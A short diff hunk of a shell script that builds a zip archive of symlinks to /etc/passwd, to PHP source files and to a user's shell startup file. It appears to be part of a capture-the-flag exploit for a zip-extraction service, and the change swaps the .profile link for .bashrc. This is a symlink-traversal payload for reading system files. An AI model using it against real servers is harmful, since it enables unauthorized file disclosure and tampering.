@@ -10,7 +10,7 @@ done
 ln -s /etc/passwd passwd
 ln -s ../../index.php index
 ln -s ../../url.php url
-ln -s /home/extract0r/.profile extract0r
+ln -s /home/extract0r/.bashrc extract0r
 
 # zip stuff
 zip --symlinks cmd.zip testfile.txt passwd index url extract0r
